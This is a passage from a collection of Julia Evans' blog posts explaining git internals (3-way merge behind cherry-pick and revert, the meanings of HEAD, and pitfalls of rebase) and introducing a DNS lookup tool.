do_recursive_merge(r, base, next, base_label, next_label, &head, &msgbuf, opts);\n \n\n So a cherry-pick is a… merge? What? How? What is it even merging? And how does merging even work in the first place? \n\n I realized that I didn’t really know how git’s merge worked, so I googled it\nand found out that git does a thing called “3-way merge”. What’s that? \n\n how git merges files: the 3-way merge \n\n Let’s say I want to merge these 2 files. We’ll call them  v1.py  and  v2.py . \n\n def greet():\n    greeting = \"hello\"\n    name = \"julia\"\n    return greeting + \" \" + name\n \n\n def say_hello():\n    greeting = \"hello\"\n    name = \"aanya\"\n    return greeting + \" \" + name\n \n\n There are two lines that differ: we have \n\n \n def greet()  and  def say_hello \n name = \"aanya\"  and  name = \"julia\" \n \n\n How do we know what to pick? It seems impossible! \n\n But what if I told you that the original function was this ( base.py )? \n\n def say_hello():\n    greeting = \"hello\"\n    name = \"julia\"\n    return greeting + \" \" + name\n \n\n Suddenly it seems a lot clearer!  v1  changed the function’s name to  greet \nand  v2  set  name = \"aanya\" . So to merge, we should make both those changes: \n\n def greet():\n    greeting = \"hello\"\n    name = \"aanya\"\n    return greeting + \" \" + name\n \n\n We can ask git to do this merge with  git merge-file , and it gives us exactly\nthe result we expected: it picks  def greet()  and  name = \"aanya\" . \n\n $ git merge-file v1.py base.py v2.py -p\ndef greet():\n    greeting = \"hello\"\n    name = \"aanya\"\n    return greeting + \" \" + name⏎\n \n\n This way of merging where you merge 2 files + their original version is called\na  3-way merge . \n\n If you want to try it out yourself in a browser, I made a little playground at\n jvns.ca/3-way-merge/ . I made it very quickly so it’s not mobile friendly. \n\n git merges changes, not files \n\n The way I think about the 3-way merge is – git merges  changes , not files.\nWe have an original file and 2 possible changes to it, and git tries to combine\nboth of those changes in a reasonable way. Sometimes it can’t (for example if\nboth changes change the same line), and then you get a merge conflict. \n\n Git can also merge more than 2 possible changes: you can have an original file\nand 8 possible changes, and it can try to reconcile all of them. That’s called\nan octopus merge but I don’t know much more than that, I’ve never done one. \n\n how git uses 3-way merge to apply a patch \n\n Now let’s get a little weird! When we talk about git “applying a patch” (as you\ndo in a  rebase  or  revert  or  cherry-pick ), it’s not actually creating a\npatch file and applying it. Instead, it’s doing a 3-way merge. \n\n Here’s how applying commit  X  as a patch to your current commit corresponds to\nthis  v1 ,  v2 , and  base  setup from before: \n\n \n The version of the file  in your current commit  is  v1 . \n The version of the file  before commit X  is  base \n The version of the file  in commit X . Call that  v2 \n Run  git merge-file v1 base v2  to combine them (technically git does not\nactually run  git merge-file , it runs a C function that does it) \n \n\n Together, you can think of  base  and  v2  as being the “patch”: the diff between\nthem is the change that you want to apply to  v1 . \n\n how cherry-pick works \n\n Let’s say we have this commit graph, and we want to cherry-pick  Y  on to  main : \n\n A - B (main)\n \\\n  \\\n   X - Y - Z\n \n\n How do we turn that into a 3-way merge? Here’s how it translates into our  v1 ,  v2  and  base  from earlier: \n\n \n B  is v1 \n X  is the base,  Y  is v2 \n \n\n So together  X  and  Y  are the “patch”. \n\n And  git rebase  is just like  git cherry-pick , but repeated a bunch of times. \n\n how revert works \n\n Now let’s say we want to run  git revert Y  on this commit graph \n\n X - Y - Z - A - B\n \n\n \n B  is v1 \n Y  is the base,  X  is v2 \n \n\n This is exactly like a cherry-pick, but with  X  and  Y  reversed. We have to\nflip them because we want to apply a “reverse patch”. \n\n Revert and cherry-pick are so closely related in git that they’re actually\nimplemented in the same file:\n revert.c . \n\n this “3-way patch” is a really cool trick \n\n This trick of using a 3-way merge to apply a commit as a patch seems really\nclever and cool and I’m surprised that I’d never heard of it before! I don’t\nknow of a name for it, but I kind of want to call it a “3-way patch”. \n\n The idea is that with a 3-way patch, you specify the patch as 2 files: the file\nbefore the patch and after ( base  and  v2  in our language in this post). \n\n So there are 3 files involved: 1 for the original and 2 for the patch. \n\n The point is that the 3-way patch is a much better way to patch than a normal\npatch, because you have a lot more context for merging when you have\nboth full files. \n\n Here’s more or less what a normal patch for our example looks like: \n\n @@ -1,1 +1,1 @@:\n- def greet():\n+ def say_hello():\n    greeting = \"hello\"\n \n\n and a 3-way patch. This “3-way patch” is not a real file format, it’s just\nsomething I made up. \n\n BEFORE: (the full file)\ndef greet():\n    greeting = \"hello\"\n    name = \"julia\"\n    return greeting + \" \" + name\nAFTER: (the full file)\ndef say_hello():\n    greeting = \"hello\"\n    name = \"julia\"\n    return greeting + \" \" + name\n \n\n “Building Git” talks about this \n\n The book  Building Git  by James Coglan\nis the only place I could find other than the git source code explaining how\n git cherry-pick  actually uses 3-way merge under the hood (I thought Pro Git might\ntalk about it, but it didn’t seem to as far as I could tell). \n\n I actually went to buy it and it turned out that I’d already bought it in 2019\nso it was a good reference to have here :) \n\n merging is actually much more complicated than this \n\n There’s more to merging in git than the 3-way merge – there’s something\ncalled a “recursive merge” that I don’t understand, and there are a bunch of\ndetails about how to deal with handling file deletions and moves, and there are\nalso multiple merge algorithms. \n\n My best idea for where to learn more about this stuff is Building Git, though I\nhaven’t read the whole thing. \n\n so what does  git apply  do? \n\n I also went looking through git’s source to find out what  git apply  does, and it\nseems to (unsurprisingly) be in  apply.c . That code parses a patch file, and\nthen hunts through the target file to figure out where to apply it. The core logic\nseems to be  around here :\nI think the idea is to start at the line number that the patch suggested and\nthen hunt forwards and backwards from there to try to find it: \n\n \t/*\n\t * There's probably some smart way to do this, but I'll leave\n\t * that to the smart and beautiful people. I'm simple and stupid.\n\t */\n\tbackwards = current;\n\tbackwards_lno = line;\n\tforwards = current;\n\tforwards_lno = line;\n\tcurrent_lno = line;\n  for (i = 0; ; i++) {\n     ...\n \n\n That all seems pretty intuitive and about what I’d naively expect. \n\n how  git apply --3way  works \n\n git apply  also has a  --3way  flag that does a 3-way merge. So we actually\ncould have more or less implemented  git cherry-pick  with  git apply  like\nthis: \n\n $ git show 10e96e46 --patch > out.patch\n$ git apply out.patch --3way\nApplied patch to 'content/post/2023-07-28-why-is-dns-still-hard-to-learn-.markdown' with conflicts.\nU content/post/2023-07-28-why-is-dns-still-hard-to-learn-.markdown\n \n\n --3way  doesn’t just use the contents of the patch file  though! The patch file starts with: \n\n index d63ade04..65778fc0 100644\n \n\n d63ade04  and  65778fc0  are the IDs of the old/new versions of that file in\ngit’s object database, so git can retrieve them to do a 3-way patch\napplication. This won’t work if someone emails you a patch and you don’t have\nthe files for the new/old versions of the file though: if you’re missing the\nblobs you’ll get this error: \n\n $ git apply out.patch\nerror: repository lacks the necessary blob to perform 3-way merge.\n \n\n 3-way merge is old \n\n A couple of people pointed out that 3-way merge is much older than git, it’s\nfrom the late 70s or something. Here’s a  paper from 2007 talking about it \n\n that’s all! \n\n I was pretty surprised to learn that I didn’t actually understand the core way\nthat git applies patches internally – it was really cool to learn about! \n\n I have  lots of issues  with git’s UI but I think this particular thing is not\none of them. The 3-way merge seems like a nice unified way to solve a bunch of\ndifferent problems, it’s pretty intuitive for people (the idea of “applying a\npatch” is one that a lot of programmers are used to thinking about, and the\nfact that it’s implemented as a 3-way merge under the hood is an implementation\ndetail that nobody actually ever needs to think about). \n\n \nAlso a very quick plug: I’m working on writing a\n zine  about git, if you’re interested in getting an email when it comes out you can\nsign up to my  very infrequent announcements mailing list .\n \n\n"},
{"url": "https://jvns.ca/blog/2024/03/08/how-head-works-in-git/", "title": "How HEAD works in git", "content": "\n     \n\n Hello! The other day I ran a Mastodon poll asking people how confident they\nwere that they understood how HEAD works in Git. The results (out of 1700\nvotes) were a little surprising to me: \n\n \n 10% “100%” \n 36% “pretty confident” \n 39% “somewhat confident?” \n 15% “literally no idea” \n \n\n I was surprised that people were so unconfident about their understanding –\nI’d been thinking of  HEAD  as a pretty straightforward topic. \n\n Usually when people say that a topic is confusing when I think it’s not, the\nreason is that there’s actually some hidden complexity that I wasn’t\nconsidering. And after some follow up conversations, it turned out that  HEAD \nactually  was  a bit more complicated than I’d appreciated! \n\n Here’s a quick table of contents: \n\n \n HEAD is actually a few different things \n the file .git/HEAD \n HEAD as in git show HEAD \n next: all the output formats \n\n \n git status: “on branch main” or “HEAD detached” \n detached HEAD state \n git log: (HEAD -> main) \n merge conflicts: <<<<<<< HEAD is just confusing \n \n \n\n HEAD is actually a few different things \n\n After talking to a bunch of different people about  HEAD , I realized that\n HEAD  actually has a few different closely related meanings: \n\n \n The file  .git/HEAD \n HEAD  as in  git show HEAD  (git calls this a “revision parameter”) \n All of the ways git uses  HEAD  in the output of various commands ( <<<<<<<<<<HEAD ,  (HEAD -> main) ,  detached HEAD state ,  On branch main , etc) \n \n\n These are extremely closely related to each other, but I don’t think the\nrelationship is totally obvious to folks who are starting out with git. \n\n the file  .git/HEAD \n\n Git has a very important file called  .git/HEAD . The way this file works is that it contains either: \n\n \n The name of a  branch  (like  ref: refs/heads/main ) \n A  commit ID  (like  96fa6899ea34697257e84865fefc56beb42d6390 ) \n \n\n This file is what determines what your “current branch” is in Git. For example, when you run  git status  and see this: \n\n $ git status\nOn branch main\n \n\n it means that the file  .git/HEAD  contains  ref: refs/heads/main . \n\n If  .git/HEAD  contains a commit ID instead of a branch, git calls that\n“detached HEAD state”. We’ll get to that later. \n\n \n(People will sometimes say that HEAD contains a name of a  reference  or a\ncommit ID, but I’m pretty sure that that the reference has to be a  branch .\nYou  can  technically make  .git/HEAD  contain the name of a reference that\nisn’t a branch by manually editing  .git/HEAD , but I don’t think you can do it\nwith a regular git command. I’d be interested to know if there is a\nregular-git-command way to make .git/HEAD a non-branch reference though, and if\nso why you might want to do that!)\n \n\n HEAD  as in  git show HEAD \n\n It’s very common to use  HEAD  in git commands to refer to a commit ID, like: \n\n \n git diff HEAD \n git rebase -i HEAD^^^^ \n git diff main..HEAD \n git reset --hard HEAD@{2} \n \n\n All of these things ( HEAD ,  HEAD^^^ ,  HEAD@{2} ) are called “revision parameters”. They’re documented in  man\ngitrevisions , and Git will try to\nresolve them to a commit ID. \n\n (I’ve honestly never actually heard the term “revision parameter” before, but\nthat’s the term that’ll get you to the documentation for this concept) \n\n HEAD in  git show HEAD  has a pretty simple meaning: it resolves to the\n current commit  you have checked out! Git resolves  HEAD  in one of two ways: \n\n \n if  .git/HEAD  contains a branch name, it’ll be the latest commit on that branch (for example by reading it from  .git/refs/heads/main ) \n if  .git/HEAD  contains a commit ID, it’ll be that commit ID \n \n\n next: all the output formats \n\n Now we’ve talked about the file  .git/HEAD , and the “revision parameter”\n HEAD , like in  git show HEAD . We’re left with all of the various ways git\nuses  HEAD  in its output. \n\n git status : “on branch main” or “HEAD detached” \n\n When you run  git status , the first line will always look like one of these two: \n\n \n on branch main . This means that  .git/HEAD  contains a branch. \n HEAD detached at 90c81c72 . This means that  .git/HEAD  contains a commit ID. \n \n\n I promised earlier I’d explain what “HEAD detached” means, so let’s do that now. \n\n detached HEAD state \n\n “HEAD is detached” or “detached HEAD state” mean that you have no current branch. \n\n Having no current branch is a little dangerous because if you make new commits,\nthose commits won’t be attached to any branch – they’ll be orphaned! Orphaned\ncommits are a problem for 2 reasons: \n\n \n the commits are more difficult to find (you can’t run  git log somebranch  to find them) \n orphaned commits will eventually be deleted by git’s garbage collection \n \n\n Personally I’m very careful about avoiding creating commits in detached HEAD state, though some people  prefer to work that way .\nGetting out of detached HEAD state is pretty easy though, you can either: \n\n \n Go back to a branch ( git checkout main ) \n Create a new branch at that commit ( git checkout -b newbranch ) \n If you’re in detached HEAD state because you’re in the middle of a rebase, finish or abort the rebase ( git rebase --abort ) \n \n\n Okay, back to other git commands which have  HEAD  in their output! \n\n git log :  (HEAD -> main) \n\n When you run  git log  and look at the first line, you might see one of the following 3 things: \n\n \n commit 96fa6899ea (HEAD -> main) \n commit 96fa6899ea (HEAD, main) \n commit 96fa6899ea (HEAD) \n \n\n It’s not totally obvious how to interpret these, so here’s the deal: \n\n \n inside the  (...) , git lists every reference that points at that commit, for example  (HEAD -> main, origin/main, origin/HEAD)  means  HEAD ,  main ,  origin/main , and  origin/HEAD  all point at that commit (either directly or indirectly) \n HEAD -> main  means that your current branch is  main \n If that line says  HEAD,  instead of  HEAD -> , it means you’re in detached HEAD state (you have no current branch) \n \n\n if we use these rules to explain the 3 examples above: the result is: \n\n \n commit 96fa6899ea (HEAD -> main)  means:\n\n \n .git/HEAD  contains  ref: refs/heads/main \n .git/refs/heads/main  contains  96fa6899ea \n \n commit 96fa6899ea (HEAD, main)  means:\n\n \n .git/HEAD  contains  96fa6899ea  (HEAD is “detached”) \n .git/refs/heads/main  also contains  96fa6899ea \n \n commit 96fa6899ea (HEAD)  means:\n\n \n .git/HEAD  contains  96fa6899ea  (HEAD is “detached”) \n .git/refs/heads/main  either contains a different commit ID or doesn’t exist \n \n \n\n merge conflicts:  <<<<<<< HEAD  is just confusing \n\n When you’re resolving a merge conflict, you might see something like this: \n\n <<<<<<< HEAD\ndef parse(input):\n    return input.split(\"\\n\")\n=======\ndef parse(text):\n    return text.split(\"\\n\\n\")\n>>>>>>> somebranch\n \n\n I find  HEAD  in this context extremely confusing and I basically just ignore it. Here’s why. \n\n \n When you do a  merge ,  HEAD  in the merge conflict is the same as what  HEAD  was when you ran  git merge . Simple. \n When you do a  rebase ,  HEAD  in the merge conflict is something totally\ndifferent: it’s the  other commit  that you’re rebasing on top of. So it’s\ntotally different from what  HEAD  was when you ran  git rebase . It’s like\nthis because rebase works by first checking out the other commit and then\nrepeatedly cherry-picking commits on top of it. \n \n\n Similarly, the meaning of “ours” and “theirs” are flipped in a merge and rebase. \n\n The fact that the meaning of  HEAD  changes depending on whether I’m doing a\nrebase or merge is really just too confusing for me and I find it much simpler\nto just ignore  HEAD  entirely and use another method to figure out which part\nof the code is which. \n\n some thoughts on consistent terminology \n\n I think HEAD would be more intuitive if git’s terminology around HEAD were a\nlittle more internally consistent. \n\n For example, git talks about “detached HEAD state”, but never about “attached\nHEAD state” – git’s documentation never uses the term “attached” at all to\nrefer to  HEAD . And git talks about being “on” a branch, but never “not on” a\nbranch. \n\n So it’s very hard to guess that  on branch main  is actually the opposite of\n HEAD detached . How is the user supposed to guess that  HEAD detached  has\nanything to do with branches at all, or that “on branch main” has anything to\ndo with  HEAD ? \n\n that’s all! \n\n If I think of other ways  HEAD  is used in Git (especially ways HEAD appears in\nGit’s output), I might add them to this post later. \n\n If you find HEAD confusing, I hope this helps a bit! \n\n"},
{"url": "https://jvns.ca/blog/2023/11/06/rebasing-what-can-go-wrong-/", "title": "git rebase: what can go wrong?", "content": "\n     \n\n Hello! While talking with folks about Git, I’ve been seeing a comment over and\nover to the effect of “I hate rebase”. People seemed to feel pretty strongly\nabout this, and I was really surprised because I don’t run into a lot of\nproblems with rebase and I use it all the time. \n\n I’ve found that if many people have a very strong opinion that’s different from\nmine, usually it’s because they have different experiences around that thing\nfrom me. \n\n So I asked on  Mastodon : \n\n \n today I’m thinking about the tradeoffs of using  git rebase  a bit. I think\nthe goal of rebase is to have a nice linear commit history, which is something\nI like. \n\n but what are the  costs  of using rebase? what problems has it caused for you\nin practice? I’m really only interested in specific bad experiences you’ve had\nhere – not opinions or general statements like “rewriting history is bad” \n \n\n I got a huge number of incredible answers to this, and I’m going to do my best\nto summarize them here. I’ll also mention solutions or workarounds to those\nproblems in cases where I know of a solution. Here’s the list: \n\n \n fixing the same conflict repeatedly is annoying \n rebasing a lot of commits is hard \n undoing a rebase is hard \n force pushing to shared branches can cause lost work \n force pushing makes code reviews harder \n losing commit metadata \n more difficult reverts \n rebasing can break intermediate commits \n accidentally run git commit –amend instead of git rebase –continue \n splitting commits in an interactive rebase is hard \n complex rebases are hard \n rebasing long lived branches can be annoying \n rebase and commit discipline \n a “squash and merge” workflow \n miscellaneous problems \n \n\n My goal with this isn’t to convince anyone that rebase is bad and you shouldn’t\nuse it (I’m certainly going to keep using rebase!). But seeing all these\nproblems made me want to be more cautious about recommending rebase to\nnewcomers without explaining how to use it safely. It also makes me wonder if\nthere’s an easier workflow for cleaning up your commit history that’s harder to\naccidentally mess up. \n\n my git workflow assumptions \n\n First, I know that people use a lot of different Git workflows. I’m going to be\ntalking about the workflow I’m used to when working on a team, which is: \n\n \n the team uses a central Github/Gitlab repo to coordinate \n there’s one central  main  branch. It’s protected from force pushes. \n people write code in feature branches and make pull requests to  main \n The web service is deployed from  main  every time a pull request is merged. \n the only way to make a change to  main  is by making a pull request on Github/Gitlab and merging it \n \n\n This is not the only “correct” git workflow (it’s a very “we run a web service”\nworkflow and open source project or desktop software with releases generally\nuse a slightly different workflow). But it’s what I know so that’s what I’ll\ntalk about. \n\n two kinds of rebase \n\n Also before we start: one big thing I noticed is that there were 2 different kinds of rebase that kept coming up, and only one of them requires you to deal with merge conflicts. \n\n \n rebasing on an ancestor , like  git rebase -i HEAD^^^^^^^  to squash many\nsmall commits into one. As long as you’re just squashing commits, you’ll\nnever have to resolve a merge conflict while doing this. \n rebasing onto a branch that has diverged , like  git rebase main . This can cause merge conflicts. \n \n\n I think it’s useful to make this distinction because sometimes I’m thinking\nabout rebase type 1 (which is a lot less likely to cause problems), but people\nwho are struggling with it are thinking about rebase type 2. \n\n Now let’s move on to all the problems! \n\n fixing the same conflict repeatedly is annoying \n\n If you make many tiny commits, sometimes you end up in a hellish loop where you\nhave to fix the same merge conflict 10 times.  You can also end up fixing merge\nconflicts totally unnecessarily (like dealing with a merge conflict in code\nthat a future commit deletes). \n\n There are a few ways to make this better: \n\n \n first do a  git rebase -i HEAD^^^^^^^^^^^  to squash all of the tiny commits\ninto 1 big commit and then a  git rebase main  to rebase onto a different\nbranch. Then you only have to fix the conflicts once. \n use  git rerere  to automate repeatedly resolving the same merge conflicts\n(“rerere” stands for “reuse recorded resolution”, it’ll record your previous merge conflict resolutions and replay them).\nI’ve never tried this but I think you need to set  git config rerere.enabled\ntrue  and then it’ll automatically help you. \n \n\n Also if I find myself resolving merge conflicts more than once in a rebase,\nI’ll usually run  git rebase --abort  to stop it and then squash my commits into\none and try again. \n\n rebasing a lot of commits is hard \n\n Generally when I’m doing a rebase onto a different branch, I’m rebasing 1-2\ncommits. Maybe sometimes 5! Usually there are no conflicts and it works\nfine. \n\n Some people described rebasing hundreds of commits by many different people onto\na different branch. That sounds really difficult and I don’t envy that task. \n\n undoing a rebase is hard \n\n I heard from several people that when they were new to rebase, they messed up a\nrebase and permanently lost a week of work that they then had to redo. \n\n The problem here is that undoing a rebase that went wrong is  much  more complicated\nthan undoing a merge that went wrong (you can undo a bad merge with something like  git reset --hard HEAD^ ).\nMany newcomers to rebase don’t even realize that undoing a rebase is even\npossible, and I think it’s pretty easy to understand why. \n\n That said, it is possible to undo a rebase that went wrong. Here’s an example of how to undo a rebase using  git reflog . \n\n step 1 : Do a bad rebase (for example run  git rebase -I HEAD^^^^^  and just delete 3 commits) \n\n step 2 :  Run  git reflog . You should see something like this: \n\n ee244c4 (HEAD -> main) HEAD@{0}: rebase (finish): returning to refs/heads/main\nee244c4 (HEAD -> main) HEAD@{1}: rebase (pick): test\nfdb8d73 HEAD@{2}: rebase (start): checkout HEAD^^^^^^^\nca7fe25 HEAD@{3}: commit: 16 bits by default\n073bc72 HEAD@{4}: commit: only show tooltips on desktop\n \n\n step 3 : Find the entry immediately before  rebase (start) . In my case that’s  ca7fe25 \n\n step 4 :  Run  git reset --hard ca7fe25 \n\n A couple of other ways to undo a rebase: \n\n \n Apparently  @  always refers to your current branch in git, so you can run\n git reset --hard @{1}  to reset your branch to its previous location. \n Another solution folks mentioned that avoids having to use the reflog is to\nmake a “backup branch” with  git switch -c backup  before rebasing, so you\ncan easily get back to the old commit. \n \n\n force pushing to shared branches can cause lost work \n\n A few people mentioned the following situation: \n\n \n You’re collaborating on a branch with someone \n You push some changes \n They rebase the branch and run  git push --force  (maybe by accident) \n Now when you run  git pull , it’s a mess – you get the a  fatal: Need to specify how to reconcile divergent branches  error \n While trying to deal with the fallout you might lose some commits, especially if some of the people are involved aren’t very comfortable with git \n \n\n This is an even worse situation than the “undoing a rebase is hard” situation\nbecause the missing commits might be split across many different people’s and\nthe only worse thing than having to hunt through the reflog is multiple\ndifferent people having to hunt through the reflog. \n\n This has never happened to me because the only branch I’ve ever collaborated on\nis  main , and  main  has always been protected from force pushing (in my\nexperience the only way you can get something into  main  is through a pull\nrequest). So I’ve never even really been in a situation where this  could \nhappen. But I can definitely see how this would cause problems. \n\n The main tools I know to avoid this are: \n\n \n don’t rebase on shared branches \n use  --force-with-lease  when force pushing, to make sure that nobody else has pushed to the branch since your last fetch \n \n\n Apparently the “since your last  fetch ” is important here – if you run  git\nfetch  immediately before running  git push --force-with-lease , the\n --force-with-lease  won’t protect you at all. \n\n I was curious about why people would run  git push --force  on a shared branch. Some reasons people gave were: \n\n \n they’re working on a collaborative feature branch, and the feature branch needs to be rebased onto  main . The idea here is that you’re just really careful about coordinating the rebase so nothing gets lost. \n as an open source maintainer, sometimes they need to rebase a contributor’s branch to fix a merge conflict \n they’re new to git, read some instructions online that suggested  git rebase  and  git push --force  as a solution, and followed them without understanding the consequences \n they’re used to doing  git push --force  on a personal branch and ran it on a shared branch by accident \n \n\n force pushing makes code reviews harder \n\n The situation here is: \n\n \n You make a pull request on GitHub \n People leave some comments \n You update the code to address the comments, rebase to clean up your commits, and force push \n Now when the reviewer comes back, it’s hard for them to tell what you changed since the last time you saw it – all the commits show up as “new”. \n \n\n One way to avoid this is to push new commits addressing the review comments,\nand then after the PR is approved do a rebase to reorganize everything. \n\n I think some reviewers are more annoyed by this problem than others, it’s kind\nof a personal preference. Also this might be a Github-specific issue, other\ncode review tools might have better tools for managing this. \n\n losing commit metadata \n\n If you’re rebasing to squash commits, you can lose important commit metadata\nlike  Co-Authored-By . Also if you GPG sign your commits, rebase loses the\nsignatures. \n\n There’s probably other commit metadata that you can lose that I’m not thinking of. \n\n I haven’t run into this one so I’m not sure how to avoid it. I think GPG\nsigning commits isn’t as popular as it used to be. \n\n more difficult reverts \n\n Someone mentioned that it’s important for them to be able to easily revert\nmerging any branch (in case the branch broke something), and if the branch\ncontains multiple commits and was merged with rebase, then you need to do\nmultiple reverts to undo the commits. \n\n In a merge workflow, I think you can revert merging any branch just by\nreverting the merge commit. \n\n rebasing can break intermediate commits \n\n If you’re trying to have a very clean commit history where the tests pass on\nevery commit (very admirable!), rebasing can result in some intermediate\ncommits that are broken and don’t pass the tests, even if the final commit\npasses the tests. \n\n Apparently you can avoid this by using  git rebase -x  to run the test suite at\nevery step of the rebase and make sure that the tests are still passing. I’ve\nnever done that though. \n\n accidentally run  git commit --amend  instead of  git rebase --continue \n\n A couple of people mentioned issues with running  git commit --amend  instead of  git rebase --continue  when resolving a merge conflict. \n\n The reason this is confusing is that there are two reasons when you might want to edit files during a rebase: \n\n \n editing a commit (by using  edit  in  git rebase -i ), where you need to write  git commit --amend  when you’re done \n a merge conflict, where you need to run  git rebase --continue  when you’re done \n \n\n It’s very easy to get these two cases mixed up because they feel very similar. I think what goes wrong here is that you: \n\n \n Start a rebase \n Run into a merge conflict \n Resolve the merge conflict, and run  git add file.txt \n Run  git commit  because that’s what you’re used to doing after you run  git add \n But you were supposed to run  git rebase --continue ! Now you have a weird extra commit, and maybe it has the wrong commit message and/or author \n \n\n splitting commits in an interactive rebase is hard \n\n The whole point of rebase is to clean up your commit history, and  combining \ncommits with rebase is pretty easy. But what if you want to split up a commit into 2\nsmaller commits? It’s not as easy, especially if the commit you want to split\nis a few commits back! I actually don’t really know how to do it even though I\nfeel very comfortable with rebase. I’d probably just do  git reset HEAD^^^   or\nsomething and use  git add -p  to redo all my commits from scratch. \n\n One person shared  their workflow for splitting commits with rebase . \n\n complex rebases are hard \n\n If you try to do too many things in a single  git rebase -i  (reorder commits\nAND combine commits AND modify a commit), it can get really confusing. \n\n To avoid this, I personally prefer to only do 1 thing per rebase, and if I want\nto do 2 different things I’ll do 2 rebases. \n\n rebasing long lived branches can be annoying \n\n If your branch is long-lived (like for 1 month), having to rebase repeatedly\ngets painful. It might be easier to just do 1 merge at the end and only resolve\nthe conflicts once. \n\n The dream is to avoid this problem by not having long-lived branches but it\ndoesn’t always work out that way in practice. \n\n miscellaneous problems \n\n A few more issues that I think are not that common: \n\n \n Stopping a rebase wrong : If you try to abort a rebase that’s going badly with\n git reset --hard  instead of  git rebase --abort , things will behave\nweirdly until you stop it properly \n Weird interactions with merge commits : A couple of quotes about this: “If you\nrebase your working copy to keep a clean history for a branch, but the\nunderlying project uses merges, the result can be ugly. If you do rebase -i\nHEAD~4 and the fourth commit back is a merge, you can see dozens of commits\nin the interactive editor.“, “I’ve learned the hard way to  never  rebase if\nI’ve merged anything from another branch” \n \n\n rebase and commit discipline \n\n I’ve seen a lot of people arguing about rebase. I’ve been thinking about why\nthis is and I’ve noticed that people work at a few different levels of “commit\ndiscipline”: \n\n \n Literally anything goes, “wip”, “fix”, “idk”, “add thing” \n When you make a pull request (on github/gitlab), squash all of your crappy commits into a single commit with a reasonable message (usually the PR title) \n Atomic Beautiful Commits – every change is split into the appropriate\nnumber of commits, where each one has a nice commit message and where they\nall tell a story around the change you’re making \n \n\n Often I think different people inside the same company have different levels of\ncommit discipline, and I’ve seen people argue about this a lot. Personally I’m\nmostly a Level 2 person. I think Level 3 might be what people mean when they say\n“clean commit history”. \n\n I think Level 1 and Level 2 are pretty easy to achieve without rebase – for\nlevel 1, you don’t have to do anything, and for level 2, you can either press\n“squash and merge” in github or run  git switch main; git merge --squash mybranch  on the command line. \n\n But for Level 3, you either need rebase or some other tool (like GitUp) to help\nyou organize your commits to tell a nice story. \n\n I’ve been wondering if when people argue about whether people “should” use\nrebase or not, they’re really arguing about which minimum level of commit\ndiscipline should be required. \n\n I think how this plays out also depends on how big the changes folks are making –\nif folks are usually making pretty small pull requests anyway, squashing them\ninto 1 commit isn’t a big deal, but if you’re making a 6000-line change you\nprobably want to split it up into multiple commits. \n\n a “squash and merge” workflow \n\n A couple of people mentioned using this workflow that doesn’t use rebase: \n\n \n make commits \n Run  git merge main  to merge main into the branch periodically (and fix conflicts if necessary) \n When you’re done, use GitHub’s “squash and merge” feature (which is the\nequivalent of running  git checkout main; git merge --squash mybranch ) to\nsquash all of the changes into 1 commit. This gets rid of all the “ugly” merge\ncommits. \n \n\n I originally thought this would make the log of commits on my branch too ugly,\nbut apparently  git log main..mybranch  will just show you the changes on your\nbranch, like this: \n\n $ git log main..mybranch\n756d4af (HEAD -> mybranch) Merge branch 'main' into mybranch\n20106fd Merge branch 'main' into mybranch\nd7da423 some commit on my branch\n85a5d7d some other commit on my branch\n \n\n Of course, the goal here isn’t to  force  people who have made beautiful\natomic commits to squash their commits – it’s just to provide an easy\noption for folks to clean up a messy commit history (“add new feature; wip;\nwip; fix; fix; fix; fix; fix;“) without having to use rebase. \n\n I’d be curious to hear about other people who use a workflow like this and if\nit works well. \n\n there are more problems than I expected \n\n I went into this really feeling like “rebase is fine, what could go wrong?” But\nmany of these problems actually have happened to me in the past, it’s just that\nover the years I’ve learned how to avoid or fix all of them. \n\n And I’ve never really seen anyone share best practices for rebase, other than\n“never force push to a shared branch”. All of these honestly make me a lot more\nreluctant to recommend using rebase. \n\n To recap, I think these are my personal rebase rules I follow: \n\n \n stop a rebase if it’s going badly instead of letting it finish (with  git rebase --abort ) \n know how to use  git reflog  to undo a bad rebase \n don’t rebase a million tiny commits (instead do it in 2 steps:  git rebase -i HEAD^^^^  and then  git rebase main ) \n don’t do more than one thing in a  git rebase -i . Keep it simple. \n never force push to a shared branch \n never rebase commits that have already been pushed to  main \n \n\n \nThanks to Marco Rogers for encouraging me to think about the problems people\nhave with rebase, and to everyone on Mastodon who helped with this.\n \n\n"},
{"url": "https://jvns.ca/blog/2021/02/24/a-little-tool-to-make-dns-queries/", "title": "A little tool to make DNS queries", "content": "\n     \n\n Hello! I made a small tool to make DNS queries\nover the last couple of days, and you can try it at  https://dns-lookup.jvns.ca/ . \n\n I started thinking about this because I’m working on writing a zine about\nowning a domain name, and I wanted to encourage people to make a bunch of DNS\nqueries to understand what the responses look like. \n\n So I tried to find other tools are available to make DNS queries. \n\n dig is kind of complicated \n\n I usually make DNS queries using  dig , like this. \n\n $ dig jvns.ca\n\n; <<>> DiG 9.16.1-Ubuntu <<>> a jvns.ca\n;; global options: +cmd\n;; Got answer:\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 8447\n;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1\n\n;; OPT PSEUDOSECTION:\n; EDNS: version: 0, flags:; udp: 512\n;; QUESTION SECTION:\n;jvns.ca.\t\t\tIN\tA\n\n;; ANSWER SECTION:\njvns.ca.\t\t216\tIN\tA\t104.21.5.215\njvns.ca.\t\t216\tIN\tA\t172.67.133.222\n\n;; Query time: 40 msec\n;; SERVER: fdaa:0:bff::3#53(fdaa:0:bff::3)\n;; WHEN: Wed Feb 24 08:53:22 EST 2021\n;; MSG SIZE  rcvd: 68\n \n\n This is great if you’re used to reading it and if you know which parts to\nignore and which parts to pay attention to, but for many people this is too\nmuch information. \n\n Like, what does  flags: qr rd ra  mean? Why does it say  QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1 ? What is the point of  MSG SIZE  rcvd: 68 ? What does  IN  mean?\nI mostly know the answers to these questions because I implemented a toy DNS server one time, but it’s kinda confusing! \n\n google webmaster tools has a nice interface for making DNS queries \n\n Google has a  DNS lookup tool  with a simple web\ninterface that lets you type in a domain name, click the kind of record you\nwant ( A ,  AAAA , etc), and get the response. I was really excited about this\nand I thought, “ok,  great, this is what I can tell people to use!”. \n\n But then I looked at the output of the tool, which you can see in this screenshot: \n\n \n\n This is just as bad as dig! (the tool is called “dig”, so it’s not a big\nsurprise, but still :)). So I thought it would be a fun project to make a DNS\nlookup tool with output that’s more comprehensible by humans \n\n I also wanted to add an option for people to query all the record types at once. \n\n what my lookup tool looks like \n\n I copied the query design from the Google tool because I thought 